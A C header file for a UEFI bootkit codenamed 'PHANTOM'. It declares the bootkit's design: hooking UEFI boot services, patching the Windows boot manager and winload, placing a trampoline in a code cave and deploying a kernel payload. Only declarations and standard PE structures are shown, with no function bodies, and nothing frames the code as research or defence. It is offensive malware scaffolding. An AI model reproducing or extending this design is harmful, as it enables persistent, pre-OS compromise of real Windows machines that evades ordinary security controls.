#ifndef _BOOTKIT_H_
#define _BOOTKIT_H_

#include "efi_defs.h"

#define BK_VERSION          "1.0.0"
#define BK_CODENAME         "PHANTOM"

#define BK_POOL_TAG         0x4B425048  /* HPBK */
#define BK_MAGIC            0xDEADC0DE

#define BK_MAX_PATTERN_LEN  256
#define BK_MAX_SECTIONS     32

/* ─── status codes ─── */
typedef enum {
    BK_SUCCESS = 0,
    BK_ERR_NOT_FOUND,
    BK_ERR_PATCH_FAILED,
    BK_ERR_ALLOC_FAILED,
    BK_ERR_PE_INVALID,
    BK_ERR_HOOK_FAILED,
    BK_ERR_BOOT_CHAIN,
} BK_STATUS;

/* ─── PE format helpers ─── */
#pragma pack(push, 1)

typedef struct {
    UINT16 e_magic;
    UINT8  _pad[58];
    UINT32 e_lfanew;
} DOS_HEADER;

typedef struct {
    UINT32 Signature;
    UINT16 Machine;
    UINT16 NumberOfSections;
    UINT32 TimeDateStamp;
    UINT32 PointerToSymbolTable;
    UINT32 NumberOfSymbols;
    UINT16 SizeOfOptionalHeader;
    UINT16 Characteristics;
} PE_FILE_HEADER;

typedef struct {
    UINT16 Magic;
    UINT8  MajorLinkerVersion;
    UINT8  MinorLinkerVersion;
    UINT32 SizeOfCode;
    UINT32 SizeOfInitializedData;
    UINT32 SizeOfUninitializedData;
    UINT32 AddressOfEntryPoint;
    UINT32 BaseOfCode;
    UINT64 ImageBase;
    UINT32 SectionAlignment;
    UINT32 FileAlignment;
    UINT16 MajorOperatingSystemVersion;
    UINT16 MinorOperatingSystemVersion;
    UINT16 MajorImageVersion;
    UINT16 MinorImageVersion;
    UINT16 MajorSubsystemVersion;
    UINT16 MinorSubsystemVersion;
    UINT32 Win32VersionValue;
    UINT32 SizeOfImage;
    UINT32 SizeOfHeaders;
    UINT32 CheckSum;
    UINT16 Subsystem;
    UINT16 DllCharacteristics;
    UINT64 SizeOfStackReserve;
    UINT64 SizeOfStackCommit;
    UINT64 SizeOfHeapReserve;
    UINT64 SizeOfHeapCommit;
    UINT32 LoaderFlags;
    UINT32 NumberOfRvaAndSizes;
} PE_OPTIONAL_HEADER64;

typedef struct {
    UINT32 VirtualAddress;
    UINT32 Size;
} DATA_DIRECTORY;

typedef struct {
    CHAR8  Name[8];
    UINT32 VirtualSize;
    UINT32 VirtualAddress;
    UINT32 SizeOfRawData;
    UINT32 PointerToRawData;
    UINT32 PointerToRelocations;
    UINT32 PointerToLinenumbers;
    UINT16 NumberOfRelocations;
    UINT16 NumberOfLinenumbers;
    UINT32 Characteristics;
} SECTION_HEADER;

#pragma pack(pop)

/* ─── boot chain context ─── */
typedef struct {
    EFI_HANDLE              ImageHandle;
    EFI_SYSTEM_TABLE       *SystemTable;
    EFI_BOOT_SERVICES      *BootServices;
    EFI_RUNTIME_SERVICES   *RuntimeServices;

    /* original functions we hook */
    EFI_EXIT_BOOT_SERVICES  OrigExitBootServices;
    EFI_IMAGE_LOAD          OrigLoadImage;
    EFI_IMAGE_START         OrigStartImage;

    /* located boot components */
    VOID                   *BootmgfwBase;
    UINTN                   BootmgfwSize;
    VOID                   *WinloadBase;
    UINTN                   WinloadSize;
    VOID                   *NtoskrnlBase;
    UINTN                   NtoskrnlSize;

    /* kernel payload */
    VOID                   *PayloadPhysical;
    UINTN                   PayloadSize;
    VOID                   *PayloadRuntimeVa;

    /* trampoline location in winload .text cave */
    UINT8                  *TrampolineSlot;

    /* state flags */
    BOOLEAN                 BootmgfwPatched;
    BOOLEAN                 WinloadPatched;
    BOOLEAN                 KernelHooked;
    BOOLEAN                 PayloadDeployed;
} BOOTKIT_CONTEXT;

extern BOOTKIT_CONTEXT gCtx;

/* ─── efi/main.c ─── */
EFI_STATUS BkDisplayBanner(VOID);
EFI_STATUS BkWaitForUsbRemoval(VOID);
EFI_STATUS BkLocateWindowsBootManager(VOID);
EFI_STATUS BkChainToBootManager(VOID);

/* ─── efi/hooks.c ─── */
EFI_STATUS BkInstallBootHooks(VOID);
EFI_STATUS BkRemoveBootHooks(VOID);

/* ─── efi/pe.c ─── */
VOID      *BkPeGetBase(VOID *Image);
UINT32     BkPeGetImageSize(VOID *Base);
VOID      *BkPeGetEntryPoint(VOID *Base);
VOID      *BkPeRvaToVa(VOID *Base, UINT32 Rva);
SECTION_HEADER *BkPeGetSection(VOID *Base, CHAR8 *Name);
VOID      *BkPeGetExport(VOID *Base, CHAR8 *FuncName);
BOOLEAN    BkPeValidate(VOID *Base);

/* ─── efi/patterns.c ─── */
VOID      *BkScanPattern(VOID *Start, UINTN Size, UINT8 *Pattern, UINT8 *Mask, UINTN PatLen);
VOID      *BkScanPatternStr(VOID *Start, UINTN Size, CHAR8 *PatternStr);

/* ─── kernel payload interface ─── */
typedef VOID (*KERNEL_PAYLOAD_ENTRY)(VOID *NtoskrnlBase, UINTN NtoskrnlSize);

EFI_STATUS BkPrepareKernelPayload(VOID);
EFI_STATUS BkDeployPayload(VOID);

#endif /* _BOOTKIT_H_ */
